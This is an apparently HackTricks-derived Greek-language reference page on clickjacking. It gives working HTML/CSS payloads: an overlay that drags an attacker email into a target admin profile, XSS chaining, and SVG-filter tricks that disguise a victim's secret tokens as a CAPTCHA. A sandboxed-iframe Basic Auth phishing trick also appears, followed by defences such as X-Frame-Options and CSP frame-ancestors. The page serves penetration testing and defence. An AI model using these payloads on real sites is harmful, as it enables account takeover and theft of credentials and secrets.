# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Τι είναι το Clickjacking

Σε μία επίθεση clickjacking, ένας **χρήστης** **παραπλανείται** ώστε να **πατήσει** ένα **στοιχείο** σε μια ιστοσελίδα που είτε είναι **αόρατο** είτε εμφανίζεται ως διαφορετικό στοιχείο. Αυτή η χειραγώγηση μπορεί να οδηγήσει σε ανεπιθύμητες συνέπειες για τον χρήστη, όπως το κατέβασμα malware, ανακατεύθυνση σε κακόβουλες ιστοσελίδες, παροχή διαπιστευτηρίων ή ευαίσθητων πληροφοριών, μεταφορές χρημάτων ή διαδικτυακές αγορές προϊόντων.

### Τρικ προ-συμπλήρωσης φορμών

Κάποιες φορές είναι δυνατό να **συμπληρωθεί η τιμή των πεδίων μιας φόρμας χρησιμοποιώντας GET παραμέτρους κατά τη φόρτωση μιας σελίδας**. Ένας επιτιθέμενος μπορεί να καταχραστεί αυτή τη συμπεριφορά για να συμπληρώσει μια φόρμα με αυθαίρετα δεδομένα και να στείλει το clickjacking payload έτσι ώστε ο χρήστης να πατήσει το κουμπί Submit.

### Συμπλήρωση φόρμας με Drag\&Drop

Αν χρειάζεστε ο χρήστης να **συμπληρώσει μια φόρμα** αλλά δεν θέλετε να του ζητήσετε άμεσα να γράψει συγκεκριμένες πληροφορίες (όπως το email ή έναν συγκεκριμένο κωδικό που γνωρίζετε), μπορείτε απλά να του ζητήσετε να **Drag\&Drop** κάτι που θα γράψει τα ελεγχόμενα δεδομένα σας όπως σε [**αυτό το παράδειγμα**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Βασικό Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Πολυσταδιακό Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Αν έχετε εντοπίσει μια **XSS επίθεση που απαιτεί από τον χρήστη να κάνει κλικ** σε κάποιο στοιχείο για να **ενεργοποιηθεί** η XSS και η σελίδα είναι **ευάλωτη σε clickjacking**, μπορείτε να το εκμεταλλευτείτε για να ξεγελάσετε τον χρήστη ώστε να κάνει κλικ στο κουμπί/σύνδεσμο.\
Παράδειγμα:\
Βρήκατε μια **self XSS** σε ορισμένες ιδιωτικές πληροφορίες του λογαριασμού (πληροφορίες που **μόνο εσείς μπορείτε να ορίσετε και να διαβάσετε**). Η σελίδα με τη **form** για να ορίσετε αυτές τις λεπτομέρειες είναι **ευάλωτη** σε **Clickjacking** και μπορείτε να **prepopulate** τη **form** με τα GET parameters.\
Ένας επιτιθέμενος θα μπορούσε να ετοιμάσει μια επίθεση **Clickjacking** σε αυτή τη σελίδα **prepopulating** τη **form** με το **XSS payload** και να **ξεγελάσει** τον **χρήστη** να πατήσει **Submit** στη φόρμα. Έτσι, **όταν η form υποβληθεί** και οι τιμές τροποποιηθούν, ο **χρήστης θα εκτελέσει την XSS**.


### DoubleClickjacking

Αρχικά [εξηγείται σε αυτό το post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), αυτή η τεχνική ζητάει από το θύμα να κάνει double click σε ένα κουμπί μιας custom σελίδας τοποθετημένης σε συγκεκριμένη θέση, και χρησιμοποιεί τις χρονικές διαφορές μεταξύ των mousedown και onclick events για να φορτώσει τη σελίδα του θύματος κατά τη διάρκεια του double click, έτσι ώστε το **θύμα στην πραγματικότητα να κλικάρει ένα νόμιμο κουμπί στη σελίδα του θύματος**.

Ένα παράδειγμα μπορείτε να δείτε σε αυτό το βίντεο: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

Ένα παράδειγμα κώδικα μπορείτε να βρείτε σε [αυτή τη σελίδα](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> Αυτή η τεχνική επιτρέπει να ξεγελαστεί ο χρήστης ώστε να κλικάρει σε ένα σημείο στη σελίδα του θύματος παρακάμπτοντας κάθε προστασία ενάντια στο clickjacking. Έτσι ο επιτιθέμενος πρέπει να βρει **ευαίσθητες ενέργειες που μπορούν να γίνουν με μόνο 1 κλικ, όπως προτροπές OAuth που αποδέχονται δικαιώματα**.

### SVG Filters / Cross-Origin Iframe UI Redressing

Οι σύγχρονες builds των Chromium/WebKit/Gecko επιτρέπουν στο CSS `filter:url(#id)` να εφαρμοστεί σε cross-origin iframes. Τα ραστεροποιημένα pixels του iframe εκτίθενται στο SVG filter graph ως `SourceGraphic`, έτσι primitives όπως `feDisplacementMap`, `feBlend`, `feComposite`, `feColorMatrix`, `feTile`, `feMorphology`, κ.ά. μπορούν να παραμορφώσουν αυθαίρετα το UI του θύματος πριν το δει ο χρήστης, παρόλο που ο επιτιθέμενος δεν αγγίζει ποτέ το DOM. Ένα απλό φίλτρο τύπου Liquid-Glass φαίνεται ως εξής:
```html
<iframe src="https://victim.example" style="filter:url(#displacementFilter4)"></iframe>
```
* Χρήσιμα primitives: `feImage` φορτώνει bitmaps επιτιθέμενου (π.χ. επικαλύψεις, χάρτες μετατόπισης); `feFlood` δημιουργεί μάσκες σταθερού χρώματος; `feOffset/feGaussianBlur` βελτιώνουν τους τονισμούς; `feDisplacementMap` διαθλά/παραμορφώνει κείμενο; `feComposite operator="arithmetic"` υλοποιεί αυθαίρετα ανά-κανάλι μαθηματικά (`r = k1*i1*i2 + k2*i1 + k3*i2 + k4`), που αρκούν για ενίσχυση αντίθεσης, μάσκες και λειτουργίες AND/OR; `feTile` κόβει και αναπαράγει ανιχνεύσεις pixel; `feMorphology` μεγαλώνει/συρρικνώνει strokes; `feColorMatrix` μεταφέρει το luma στο alpha για να δημιουργήσει ακριβείς μάσκες.

#### Distorting secrets into CAPTCHA-style prompts

Αν ένα endpoint που μπορεί να τοποθετηθεί σε frame αποδίδει μυστικά (tokens, reset codes, API keys), ο επιτιθέμενος μπορεί να τα παραμορφώσει ώστε να μοιάζουν με CAPTCHA και να εξαναγκάσει σε χειροκίνητη μεταγραφή:
```html
<svg width="0" height="0">
<filter id="captchaFilter">
<feTurbulence type="turbulence" baseFrequency="0.03" numOctaves="4" result="noise" />
<feDisplacementMap in="SourceGraphic" in2="noise" scale="6" xChannelSelector="R" yChannelSelector="G" />
</filter>
</svg>
<iframe src="https://victim" style="filter:url(#captchaFilter)"></iframe>
<input pattern="^6c79 ?7261 ?706f ?6e79$" required>
```
Οι παραμορφωμένοι πίξελ εξαπατούν τον χρήστη ώστε να «λύσει» το captcha μέσα στο ελεγχόμενο από τον επιτιθέμενο `<input>` του οποίου το `pattern` επιβάλλει το πραγματικό μυστικό του θύματος.

#### Επαναπλαισίωση των εισόδων του θύματος

Τα φίλτρα μπορούν να διαγράψουν χειρουργικά το placeholder/validation text ενώ διατηρούν τις πληκτρολογήσεις του χρήστη. Μία ροή εργασίας:

1. `feComposite operator="arithmetic" k2≈4` ενισχύει τη φωτεινότητα, ώστε το γκρι βοηθητικό κείμενο να κορεστεί σε λευκό.
2. `feTile` περιορίζει την περιοχή εργασίας στο ορθογώνιο του input.
3. `feMorphology operator="erode"` παχύνει τους σκοτεινούς χαρακτήρες που πληκτρολογεί το θύμα και τους αποθηκεύει με `result="thick"`.
4. `feFlood` δημιουργεί μια λευκή πλάκα, `feBlend mode="difference"` με το `thick`, και ένα δεύτερο `feComposite k2≈100` το μετατρέπει σε έντονο luma matte.
5. `feColorMatrix` μεταφέρει αυτό το luma στο alpha, και `feComposite in="SourceGraphic" operator="in"` κρατά μόνο τους χαρακτήρες που εισήγαγε ο χρήστης.
6. Άλλο `feBlend in2="white"` μαζί με μια λεπτή περικοπή δίνουν ένα καθαρό textbox, μετά το οποίο ο επιτιθέμενος επικαλύπτει δικές του HTML ετικέτες (π.χ. “Enter your email”), ενώ το κρυφό iframe εξακολουθεί να επιβάλλει την πολιτική κωδικού προέλευσης του θύματος.

Το Safari έχει προβλήματα με `feTile`; το ίδιο αποτέλεσμα μπορεί να αναπαραχθεί με χωρικές μάσκες φτιαγμένες από `feFlood` + `feColorMatrix` + `feComposite` για WebKit-only payloads.

#### Ανιχνεύσεις pixel, λογική και μηχανές κατάστασης

Κόβοντας μια περιοχή 2–4 px με `feTile` και πλακάροντάς την σε `100%` του viewport, ο επιτιθέμενος μετασχηματίζει το δειγματοληπτημένο χρώμα σε πλήρους πλαισίου υφή που μπορεί να μετατραπεί σε boolean μάσκα με κατωφλίωση:
```html
<filter id="pixelProbe">
<feTile x="313" y="141" width="4" height="4" />
<feTile x="0" y="0" width="100%" height="100%" result="probe" />
<feComposite in="probe" operator="arithmetic" k2="120" k4="-1" />
<feColorMatrix type="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 1 0 0" result="mask" />
<feGaussianBlur in="SourceGraphic" stdDeviation="2" />
<feComposite operator="in" in2="mask" />
<feBlend in2="SourceGraphic" />
</filter>
```
Για αυθαίρετα χρώματα, μια αναφορά `feFlood` (π.χ. `#0B57D0`) μαζί με `feBlend mode="difference"` και ένα ακόμη arithmetic composite (`k2≈100`, `k4` ως ανοχή) παράγουν λευκό μόνο όταν το δειγματισμένο pixel ταιριάζει με την επιθυμητή απόχρωση. Τροφοδοτώντας αυτές τις μάσκες στο `feComposite` με ρυθμισμένα `k1..k4` προκύπτουν λογικές πύλες: `AND` μέσω `k1=1`, `OR` μέσω `k2=k3=1`, `XOR` μέσω `feBlend mode="difference"`, `NOT` μέσω blending ενάντια σε λευκό. Η αλληλοσύνδεση των πυλών σχηματίζει έναν full adder μέσα στο filter graph, αποδεικνύοντας ότι το pipeline είναι functionally complete.

Συνεπώς, οι επιτιθέμενοι μπορούν να διαβάσουν την κατάσταση του UI χωρίς JavaScript. Παραδείγματα boolean από ένα modal workflow:

- **D** (διάλογος ορατός): εξετάστε μια σκοτεινή γωνία και συγκρίνετε με λευκό.
- **L** (διάλογος φορτωμένος): εντοπίστε τις συντεταγμένες όπου εμφανίζεται το κουμπί μόλις είναι έτοιμο.
- **C** (checkbox επιλεγμένο): συγκρίνετε το pixel του checkbox με το ενεργό μπλε `#0B57D0`.
- **R** (κόκκινο success/failure banner): χρησιμοποιήστε `feMorphology` και red thresholds μέσα στο ορθογώνιο του banner.

Κάθε ανιχνευμένη κατάσταση ενεργοποιεί ένα διαφορετικό overlay bitmap ενσωματωμένο μέσω `feImage xlink:href="data:..."`. Η μάσκα αυτών των bitmap με `D`, `L`, `C`, `R` κρατά τα overlays συγχρονισμένα με τον πραγματικό διάλογο και καθοδηγεί το θύμα μέσα από multi-step workflows (password resets, approvals, destructive confirmations) χωρίς ποτέ να αποκαλύπτει το DOM.

### Sandboxed iframe Basic Auth dialog (no allow-popups)

Ένα sandboxed iframe χωρίς `allow-popups` μπορεί παρ' όλα αυτά να εμφανίσει ένα browser-controlled **HTTP Basic Authentication modal** όταν ένα load επιστρέψει `401` με `WWW-Authenticate`. Ο διάλογος δημιουργείται από το browser’s networking/auth layer (όχι από JS `alert/prompt/confirm`), οπότε οι περιορισμοί popup στο sandbox **δεν** τον αποσβένουν. Αν μπορείτε να scriptάρετε το iframe (π.χ. `sandbox="allow-scripts"`) μπορείτε να το πλοηγήσετε σε οποιοδήποτε endpoint που εκδίδει Basic Auth challenge:
```html
<iframe id="basic" sandbox="allow-scripts"></iframe>
<script>
basic.src = "https://httpbin.org/basic-auth/user/pass"
</script>
```
Μόλις φτάσει η απάντηση, ο browser ζητά credentials παρόλο που τα popups απαγορεύονται. Το framing ενός trusted origin με αυτό το κόλπο επιτρέπει UI redress/phishing: απρόσμενα modal prompts μέσα σε ένα "sandboxed" widget μπορούν να μπερδέψουν χρήστες ή να ενεργοποιήσουν password managers ώστε να προσφέρουν αποθηκευμένα credentials.

### Browser extensions: DOM-based autofill clickjacking

Εκτός από το iframing των victim pages, attackers μπορούν να στοχεύσουν στοιχεία UI των browser extensions που εισάγονται στη σελίδα. Password managers εμφανίζουν autofill dropdowns κοντά στα focused inputs· με το να εστιάσει το focus σε ένα attacker-controlled field και να κρύψει/αποκρύψει το dropdown της επέκτασης (tricks με opacity/overlay/top-layer), ένα αναγκασμένο click χρήστη μπορεί να επιλέξει ένα αποθηκευμένο item και να γεμίσει ευαίσθητα δεδομένα σε attacker-controlled inputs. Αυτή η παραλλαγή δεν απαιτεί έκθεση μέσω iframe και λειτουργεί εξ ολοκλήρου μέσω DOM/CSS manipulation.

- For concrete techniques and PoCs see:
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

Scripts που εκτελούνται στην πλευρά του client μπορούν να κάνουν ενέργειες για να αποτρέψουν το Clickjacking:

- Διασφάλιση ότι το application window είναι το main ή top window.
- Κάνοντας όλα τα frames ορατά.
- Αποτροπή clicks σε αόρατα frames.
- Εντοπισμός και ειδοποίηση των χρηστών για πιθανές προσπάθειες Clickjacking.

Ωστόσο, αυτά τα frame-busting scripts μπορεί να παρακαμφθούν:

- **Browsers' Security Settings:** Κάποιοι browsers μπορεί να μπλοκάρουν αυτά τα scripts με βάση τις ρυθμίσεις ασφαλείας τους ή την έλλειψη υποστήριξης JavaScript.
- **HTML5 iframe `sandbox` Attribute:** Ένας attacker μπορεί να εξουδετερώσει frame buster scripts κάνοντας set το `sandbox` attribute με τιμές `allow-forms` ή `allow-scripts` χωρίς `allow-top-navigation`. Αυτό εμποδίζει το iframe από το να επαληθεύσει αν είναι το top window, π.χ.
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
Οι τιμές `allow-forms` και `allow-scripts` επιτρέπουν ενέργειες μέσα στο iframe ενώ απενεργοποιούν την πλοήγηση στο ανώτατο επίπεδο. Για να διασφαλιστεί η προβλεπόμενη λειτουργικότητα του στοχευόμενου ιστότοπου, ίσως χρειαστούν επιπλέον άδειες όπως `allow-same-origin` και `allow-modals`, ανάλογα με τον τύπο της επίθεσης. Τα μηνύματα της κονσόλας του browser μπορούν να καθοδηγήσουν ποιες άδειες πρέπει να επιτρέπονται.

### Αμυντικές Μέθοδοι από την πλευρά του διακομιστή

#### X-Frame-Options

Ο **header απόκρισης HTTP `X-Frame-Options`** ενημερώνει τους περιηγητές για το αν είναι αποδεκτό να εμφανιστεί μια σελίδα μέσα σε `<frame>` ή `<iframe>`, βοηθώντας στην πρόληψη του Clickjacking:

- `X-Frame-Options: deny` - Κανένας τομέας δεν μπορεί να ενσωματώσει το περιεχόμενο.
- `X-Frame-Options: sameorigin` - Μόνο ο τρέχων ιστότοπος μπορεί να ενσωματώσει το περιεχόμενο.
- `X-Frame-Options: allow-from https://trusted.com` - Μόνο το συγκεκριμένο 'uri' μπορεί να ενσωματώσει τη σελίδα.
- Σημειώστε τους περιορισμούς: αν ο browser δεν υποστηρίζει αυτή την οδηγία, ίσως να μην λειτουργήσει. Ορισμένοι browsers προτιμούν την οδηγία frame-ancestors του CSP.

#### Οδηγία frame-ancestors του Content Security Policy (CSP)

Η **οδηγία `frame-ancestors` στο CSP** είναι η συνιστώμενη μέθοδος για την προστασία από Clickjacking:

- `frame-ancestors 'none'` - Παρόμοιο με `X-Frame-Options: deny`.
- `frame-ancestors 'self'` - Παρόμοιο με `X-Frame-Options: sameorigin`.
- `frame-ancestors trusted.com` - Παρόμοιο με `X-Frame-Options: allow-from`.

Για παράδειγμα, η ακόλουθη CSP επιτρέπει τη χρήση framing μόνο από τον ίδιο τομέα:

`Content-Security-Policy: frame-ancestors 'self';`

Περαιτέρω λεπτομέρειες και σύνθετα παραδείγματα μπορείτε να βρείτε στην [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) και στην [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) με `child-src` και `frame-src`

Η **Content Security Policy (CSP)** είναι ένα μέτρο ασφάλειας που βοηθά στην αποτροπή του Clickjacking και άλλων επιθέσεων εισαγωγής κώδικα, προσδιορίζοντας ποιες πηγές πρέπει να επιτρέψει ο browser για φόρτωση περιεχομένου.

#### `frame-src` Directive

- Ορίζει έγκυρες πηγές για frames.
- Πιο συγκεκριμένο από την οδηγία `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Αυτή η πολιτική επιτρέπει frames από την ίδια προέλευση (self) και https://trusted-website.com.

#### `child-src` Directive

- Εισήχθη στο CSP level 2 για να ορίσει έγκυρες πηγές για web workers και frames.
- Λειτουργεί ως fallback για frame-src και worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Αυτή η πολιτική επιτρέπει frames και workers από την ίδια προέλευση (self) και https://trusted-website.com.

**Σημειώσεις χρήσης:**

- Απόσυρση: Το child-src σταδιακά αποσύρεται υπέρ των frame-src και worker-src.
- Συμπεριφορά fallback: Εάν το frame-src λείπει, το child-src χρησιμοποιείται ως fallback για frames. Εάν και τα δύο λείπουν, το default-src χρησιμοποιείται.
- Αυστηρός ορισμός πηγών: Περιλάβετε μόνο αξιόπιστες πηγές στις οδηγίες για να αποτραπεί εκμετάλλευση.

#### JavaScript Frame-Breaking Scripts

Παρόλο που δεν είναι εντελώς αξιόπιστα, τα JavaScript-based frame-busting scripts μπορούν να χρησιμοποιηθούν για να αποτρέψουν μια ιστοσελίδα από το να τοποθετηθεί σε frame. Παράδειγμα:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Χρήση Anti-CSRF Tokens

- **Token Validation:** Χρησιμοποιήστε anti-CSRF tokens σε web εφαρμογές για να διασφαλίσετε ότι τα αιτήματα που αλλάζουν κατάσταση γίνονται εσκεμμένα από τον χρήστη και όχι μέσω μιας Clickjacked σελίδας.

## Αναφορές

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)
- [SVG Filters - Clickjacking 2.0](https://lyra.horse/blog/2025/12/svg-clickjacking/)
- [Iframe sandbox Basic Auth modal](https://phor3nsic.github.io/2026/01/21/trick-iframe-sandbox.html)
- [Chromestatus: Restrict sandboxed frame dialogs](https://chromestatus.com/feature/4747009953103872)
- [Chromium issue about sandboxed auth dialogs](https://issues.chromium.org/issues/40266321)

{{#include ../banners/hacktricks-training.md}}
